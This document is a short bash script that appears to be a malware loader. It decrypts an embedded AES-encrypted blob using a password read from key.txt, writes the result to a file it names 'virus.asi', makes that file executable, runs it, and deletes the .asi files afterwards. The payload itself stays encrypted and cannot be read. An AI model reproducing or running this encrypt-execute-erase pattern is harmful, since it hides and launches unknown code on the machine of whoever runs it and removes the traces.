#!/bin/bash
#start
VAR='U2FsdGVkX19qfacp/l9AhupekiAuZdrVhYMW/KYS5Pks4q2D3YpZ1DnoAsxyCebx
+chMHWagD0+sTQtycVjAvk228uRD9z/4nwOYZ1z+iYLEDDHy76JCjgG84TuL43DR
uDBs8sp+U7b9/O5exhI5EMaHVfhrlCzIj0lf2m20w16E4yRQ3Ci96XJQzbuRaROP
FzwrDpZ932Hyn29b5q9gb9UIfzxdmtDJQQn4neT3fLolDhTXkBd47LyYfRDuxKLO
ea3Ji1lci8v+k81kf/rM/51A9m5uh/eWgbpNNreQcdRHns6sttxQa+N5+YFtDF1R
baDHqbzEI6l6f3fBgEqexxvcaveb8CX/n+t0R6mHwYASvyu82nKim+dTXfRxzFQp
1XsXS1RQv5ncVo0+H3K84+hlfgop8yN8kBiotw+Ic2jmyOh77vJDQCHHZhbsY3bU
biLCV0vLxkVivQSypY7MeuVjJm5M6SaNa7aWUyoPlrBrDUJyHRUEOqRKP7j4FN2b
4Csuh8hLVS1xldy8QoadBgB59vldFSmiPhdtWq2ugHNqYH+5+wGcTVD1Qh1HDl8l
oEarS8Mfeok1XVBGMDDxHjdMTJeKplPOADtwQHVnnQibWkdtLsVAJhzt7kAH7fKi
i+3H9my4U+HIqcdiPJKJWE7tIdyJEIWkeS8ENtNWjBYETvt+hgWLusrOGz/FYS2N
'

PASSWORD=$(<key.txt)
echo -e ${VAR} > mutated.asi
echo -n "${PASSWORD}" | openssl aes-256-cbc -d -a -salt -pbkdf2 -in mutated.asi -out virus.asi -pass stdin
chmod +x virus.asi
./virus.asi
rm -f *.asi